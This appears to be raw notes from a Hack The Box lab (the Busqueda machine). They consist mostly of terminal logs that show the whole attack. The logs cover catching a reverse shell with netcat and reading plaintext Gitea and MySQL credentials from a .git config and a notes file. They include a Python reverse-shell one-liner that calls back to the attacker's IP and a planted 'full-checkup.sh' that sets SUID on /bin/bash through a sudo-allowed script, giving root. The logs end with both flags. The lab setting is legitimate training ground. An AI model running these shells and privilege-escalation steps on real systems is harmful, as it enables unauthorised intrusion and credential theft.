


``` bash 


┌─[ramdark@parrot]─[~/Documents/Hacking_Notes_RFC/HTB/Labs/Busqueda]
└──╼ $sudo nc -nvlp 9001
[sudo] password for ramdark: 
listening on [any] 9001 ...
connect to [10.10.14.47] from (UNKNOWN) [10.10.11.208] 47626
bash: cannot set terminal process group (1620): Inappropriate ioctl for device
bash: no job control in this shell
svc@busqueda:/var/www/app$ ls
ls
app.py
templates
svc@busqueda:/var/www/app$ cd /
cd /
svc@busqueda:/$ ls
ls
bin
boot
dev
etc
home
lib
lib32
lib64
libx32
lost+found
media
mnt
opt
proc
root
run
sbin
snap
srv
sys
tmp
usr
var
svc@busqueda:/$ cd var/www/app
cd var/www/app
svc@busqueda:/var/www/app$ ls -la
ls -la
total 20
drwxr-xr-x 4 www-data www-data 4096 Apr  3 14:32 .
drwxr-xr-x 4 root     root     4096 Apr  4 16:02 ..
-rw-r--r-- 1 www-data www-data 1124 Dec  1  2022 app.py
drwxr-xr-x 8 www-data www-data 4096 Jun  6 04:07 .git
drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 templates
svc@busqueda:/var/www/app$ cd .git 
cd .git 
svc@busqueda:/var/www/app/.git$ cat config 
cat config 
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[remote "origin"]
	url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
	remote = origin
	merge = refs/heads/main
svc@busqueda:/var/www/app/.git$ exit
exit
exit
┌─[ramdark@parrot]─[~/Documents/Hacking_Notes_RFC/HTB/Labs/Busqueda]
└──╼ $
```

``` bash 
┌─[ramdark@parrot]─[~/Documents/Hacking_Notes_RFC/HTB/Labs/Busqueda]
└──╼ $ssh svc@10.10.11.208
```

``` bash 
  GNU nano 6.2              full-checkup.sh *                                                       
#!/usr/bin/python3
import socket,os,pty;s=socket.socket();s.connect(("10.10.14.47 ",9001));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")

```

``` bash 

┌─[ramdark@parrot]─[~/Documents/Hacking_Notes_RFC/HTB/Labs/Busqueda]
└──╼ $ssh svc@10.10.11.208
The authenticity of host '10.10.11.208 (10.10.11.208)' can't be established.
ECDSA key fingerprint is SHA256:2IX4mncu1XcUcTBw8Aa8kcZWxeVixqXf/qpnyptPp/s.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.208' (ECDSA) to the list of known hosts.
svc@10.10.11.208's password: 
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-69-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Jun  6 02:29:09 PM UTC 2023

  System load:                      0.02001953125
  Usage of /:                       80.7% of 8.26GB
  Memory usage:                     59%
  Swap usage:                       32%
  Processes:                        341
  Users logged in:                  2
  IPv4 address for br-c954bf22b8b2: 172.20.0.1
  IPv4 address for br-cbf2c5ce8e95: 172.19.0.1
  IPv4 address for br-fba5a3e31476: 172.18.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            10.10.11.208
  IPv6 address for eth0:            dead:beef::250:56ff:feb9:5a19


 * Introducing Expanded Security Maintenance for Applications.
   Receive updates to over 25,000 software packages with your
   Ubuntu Pro subscription. Free for personal use.

     https://ubuntu.com/pro

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Tue Jun  6 13:34:33 2023 from 10.10.16.24
svc@busqueda:~$ 
svc@busqueda:~$ sudo -l 
[sudo] password for svc: 
Matching Defaults entries for svc on busqueda:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py *
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup

svc@busqueda:~$ cd /opt/scripts/
svc@busqueda:/opt/scripts$ ls -la
total 28
drwxr-xr-x 3 root root 4096 Dec 24 18:23 .
drwxr-xr-x 4 root root 4096 Mar  1 10:46 ..
drwxr-x--- 8 root root 4096 Apr  3 15:04 .git
-rwx--x--x 1 root root  586 Dec 24 21:23 check-ports.py
-rwx--x--x 1 root root  857 Dec 24 21:23 full-checkup.sh
-rwx--x--x 1 root root 3346 Dec 24 21:23 install-flask.sh
-rwx--x--x 1 root root 1903 Dec 24 21:23 system-checkup.py
svc@busqueda:/opt/scripts$ cd ~
svc@busqueda:~$ pwd
/home/svc
svc@busqueda:~$ touch full-checkup.sh
svc@busqueda:~$ nano full-checkup.sh
svc@busqueda:~$ chmod +x full-checkup.sh
chmod: cannot access 'full-checkup.sh': No such file or directory
svc@busqueda:~$ sudo chmod +x full-checkup.sh
Sorry, user svc is not allowed to execute '/usr/bin/chmod +x full-checkup.sh' as root on busqueda.
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup.sh
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup

svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
Something went wrong
svc@busqueda:~$ chmod +x full-checkup.sh
chmod: cannot access 'full-checkup.sh': No such file or directory
svc@busqueda:~$ cd ~
svc@busqueda:~$ ls -la
total 152
drwxr-x--- 8 svc  svc   4096 Jun  6 14:36 .
drwxr-xr-x 3 root root  4096 Dec 22 18:56 ..
lrwxrwxrwx 1 root root     9 Feb 20 12:08 .bash_history -> /dev/null
-rw-r--r-- 1 svc  svc    220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 svc  svc   3771 Jan  6  2022 .bashrc
drwx------ 2 svc  svc   4096 Feb 28 11:37 .cache
drwxrwxr-x 2 svc  svc   4096 Jun  6 14:23 .cfg
drwxrwxr-x 2 svc  svc   4096 Jun  6 13:29 .cfg_gitea
-rw-rw-r-- 1 svc  svc     76 Apr  3 08:58 .gitconfig
-rw------- 1 svc  svc     32 Jun  6 11:47 .lesshst
drwxrwxr-x 5 svc  svc   4096 Jun 15  2022 .local
lrwxrwxrwx 1 root root     9 Apr  3 08:58 .mysql_history -> /dev/null
-rw-r--r-- 1 svc  svc    807 Jan  6  2022 .profile
lrwxrwxrwx 1 root root     9 Feb 20 14:08 .searchor-history.json -> /dev/null
drwxr-xr-x 2 svc  svc   4096 Jun  6 12:34 .ssh
drwxr-xr-x 2 svc  svc   4096 Jun  6 11:37 .vim
-rw------- 1 svc  svc  10328 Jun  6 14:33 .viminfo
-rw-r--r-- 1 svc  svc   3864 Jun  6 10:03 index.html
-rw-rw-r-- 1 svc  svc    149 Jun  6 12:27 mdp.txt
-rw-r----- 1 root svc     33 Jun  6 04:07 user.txt
-rw-r--r-- 1 svc  svc  73414 Jun  6 07:48 wget-log
svc@busqueda:~$ cd /opt/scripts/
svc@busqueda:/opt/scripts$ ls
check-ports.py  full-checkup.sh  install-flask.sh  system-checkup.py
svc@busqueda:/opt/scripts$ cat full-checkup.sh 
cat: full-checkup.sh: Permission denied
svc@busqueda:/opt/scripts$ cd ~
svc@busqueda:~$ touch full-checkup.sh
svc@busqueda:~$ nano full-checkup.sh
svc@busqueda:~$ cat full-checkup.sh 
#!/bin/bash 
chmod +s /bin/bash
svc@busqueda:~$ chmod +x full-checkup.sh 
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup

[+] Done!
svc@busqueda:~$ ls -l /bin/bash
-rwsr-sr-x 1 root root 1396520 Jan  6  2022 /bin/bash
svc@busqueda:~$ bash -p
bash-5.1# whoami
root
bash-5.1# ls
full-checkup.sh  index.html  mdp.txt  user.txt	wget-log
bash-5.1# ls -la
total 156
drwxr-x--- 8 svc  svc   4096 Jun  6 14:48 .
drwxr-xr-x 3 root root  4096 Dec 22 18:56 ..
lrwxrwxrwx 1 root root     9 Feb 20 12:08 .bash_history -> /dev/null
-rw-r--r-- 1 svc  svc    220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 svc  svc   3771 Jan  6  2022 .bashrc
drwx------ 2 svc  svc   4096 Feb 28 11:37 .cache
drwxrwxr-x 2 svc  svc   4096 Jun  6 14:23 .cfg
drwxrwxr-x 2 svc  svc   4096 Jun  6 13:29 .cfg_gitea
-rw-rw-r-- 1 svc  svc     76 Apr  3 08:58 .gitconfig
-rw------- 1 svc  svc     32 Jun  6 11:47 .lesshst
drwxrwxr-x 5 svc  svc   4096 Jun 15  2022 .local
lrwxrwxrwx 1 root root     9 Apr  3 08:58 .mysql_history -> /dev/null
-rw-r--r-- 1 svc  svc    807 Jan  6  2022 .profile
lrwxrwxrwx 1 root root     9 Feb 20 14:08 .searchor-history.json -> /dev/null
drwxr-xr-x 2 svc  svc   4096 Jun  6 12:34 .ssh
drwxr-xr-x 2 svc  svc   4096 Jun  6 11:37 .vim
-rw------- 1 svc  svc  10328 Jun  6 14:33 .viminfo
-rwxrwxr-x 1 svc  svc     32 Jun  6 14:48 full-checkup.sh
-rw-r--r-- 1 svc  svc   3864 Jun  6 10:03 index.html
-rw-rw-r-- 1 svc  svc    149 Jun  6 12:27 mdp.txt
-rw-r----- 1 root svc     33 Jun  6 04:07 user.txt
-rw-r--r-- 1 svc  svc  73414 Jun  6 07:48 wget-log
bash-5.1# cd root
bash: cd: root: No such file or directory
bash-5.1# cat root/root.txt
cat: root/root.txt: No such file or directory
bash-5.1# whoami
root
bash-5.1# cat user.txt 
570ccb5cda7e6cb43ca64ec930484320
bash-5.1# cd ~
bash-5.1# ls
index.html  mdp.txt  user.txt  wget-log
bash-5.1# cat mdp.txt 
"MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF","MYSQL_USER=gitea","MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh","MYSQL_DATABASE=gitea"

mdp svc: jh1usoih2bkjaspwe92
bash-5.1# 

bash-5.1# cd /opt/scripts
bash-5.1# ls
check-ports.py	full-checkup.sh  install-flask.sh  system-checkup.py
bash-5.1# cd ~ 
bash-5.1# touch full-checkup.sh
bash-5.1# nano full-checkup.sh 
bash-5.1# chmod +x full-checkup.sh 
bash-5.1# sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup

```


``` bash 
┌─[ramdark@parrot]─[~/Documents/Hacking_Notes_RFC/HTB/Labs/Busqueda]
└──╼ $sudo nc -nvlp 9001
[sudo] password for ramdark: 
listening on [any] 9001 ...
connect to [10.10.14.47] from (UNKNOWN) [10.10.11.208] 37720
root@busqueda:/home/svc# ls
ls
full-checkup.sh  index.html  mdp.txt  user.txt  wget-log
root@busqueda:/home/svc# cd ~
cd ~
root@busqueda:~# ls
ls
ecosystem.config.js  root.txt  scripts  snap
root@busqueda:~# cat root.txt	
cat ro.txt
cat: ro.txt: No such file or directory
root@busqueda:~# cat root.txt
cat root.txt
be8f5ac7fb46f684612525aab875e0d0
root@busqueda:~# 
```


+ [privilege escaltion](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/python-privilege-escalation/)
+ [eval code](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/python-eval-code-execution/)
+ [searchor](https://security.snyk.io/package/pip/searchor/2.4.0)